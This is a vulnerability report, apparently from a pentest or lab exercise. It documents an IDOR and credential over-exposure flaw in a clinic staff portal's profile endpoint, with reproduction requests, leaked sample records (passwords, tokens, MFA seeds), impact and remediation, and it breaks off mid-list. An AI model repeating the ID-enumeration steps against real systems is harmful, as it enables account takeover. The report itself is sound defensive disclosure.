# H-01: IDOR + Sensitive Credential Exposure on Staff Profile Endpoint

- **CWE:** CWE-639 (IDOR) + CWE-213 / CWE-200 (Sensitive Data Exposure)
- **OWASP:** A01:2021 Broken Access Control
- **Endpoint:** `GET /portal/profile/{id}`
- **Severity:** Critical
- **CVSS 3.1:** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` — 9.9

## Summary

Two independent flaws stacked on one endpoint. First: `GET /portal/profile/{id}` over-serializes the full backend user record into the page's rendered HTML, including `password`, `password_hash`, `auth_token`, and `mfa_secret` — fields that should never reach any client, even the account's own owner. Second: the endpoint enforces a clinic-level boundary check but no per-user ownership check, so any staff member can read these fields for every colleague in their own clinic, not just themselves.

## Discovery

While reviewing my own profile page response, I noticed the server embeds the full user object into a `window.__INIT_PROFILE__` JavaScript blob directly in the HTML — visible via "view source" with no special tooling.

## Steps to Reproduce

### Step 1 — Confirm over-exposure on my own account

```http
GET /portal/profile/2 HTTP/1.1
Authorization: <own session>
```
Response embedded my own full record, including:
```json
{
  "id": 2, "username": "dr.morgan", "password": "pw-morgan",
  "full_name": "Dr. Adrian Morgan", "role": "physician", "clinic_id": 1,
  "email": "amorgan@hospitalhub.local",
  "password_hash": "$2a$10$8eXyZmqp.aabcdef9PEHPKAAA.uV8/Xt0vJh3pXn1xJq2dB7eCmDXX",
  "auth_token": "authtok-a3f5b21c9d",
  "mfa_secret":"JBSWY3DPEHPK3PXP-CMO-SEED" ,
  "private_notes": "Reviews cardiology consults."
}
```
This alone is a serious finding — my own browser receives credential material it has no legitimate need for.

### Step 2 — Test for IDOR within the same clinic

```http
GET /portal/profile/3 HTTP/1.1
```
Blocked, with an explicit boundary message:
```html
<h3>Not in your clinic</h3>
<p>You can only view profiles of colleagues assigned to your clinic. User #3 is not a teammate.</p>
```
This confirms a clinic-level check exists.

```http
GET /portal/profile/1 HTTP/1.1
GET /portal/profile/4 HTTP/1.1
```
Both returned `200 OK` with full records — **same clinic as my account, but different individuals**, including the same sensitive fields. `id 1` resolved to **Dr. Evelyn Harlan, Chief of Medicine**:
```json
{
  "id": 1, "username": "dr.harlan", "password": "cmo-do-not-guess-9f2a",
  "full_name": "Dr. Evelyn Harlan", "role": "chief_of_medicine", "clinic_id": 1,
  "password_hash": "$2a$10$YHk9KPGfNc.Rg7eA.LqkP.uV8/Xt0vJh3pXn1xJq2dB7eCmDw3yWG",
  "auth_token": "cmo-auth-72150742c66b",
  "mfa_secret": "JBSWY3DPEHPK3PXP-CMO-SEED",
  "private_notes": "Office calendar locked."
}
```

## Impact

Any authenticated staff member can harvest live credentials — including auth tokens and MFA seeds — for every colleague in their own clinic, including the most senior role on staff (Chief of Medicine). This directly enabled S-01's confirmed account takeover. Even setting aside the IDOR, the over-exposure of these fields is a standalone critical issue: no client, under any circumstance, should receive a raw password, password hash, auth token, or MFA secret from a profile-view endpoint.

## Root Cause

Two independent failures:
1. **Missing user-level ownership check** — the endpoint scopes access only at the clinic level, never checking `profile.id == current_user.id`.
2. **Over-serialization** — the backend returns the full ORM/database object to the view layer instead of a sanitized, explicit allow-list of client-safe fields.

## Remediation

1. Add a strict per-user ownership check, independent of and in addition to the clinic-level check.
2. Separate "view my own full profile" from "view a colleague's profile" as distinct use cases: colleague views should return a small, explicit allow-list (name, role, email) — never credential fields.
3. Never include `password`, `password_hash`,
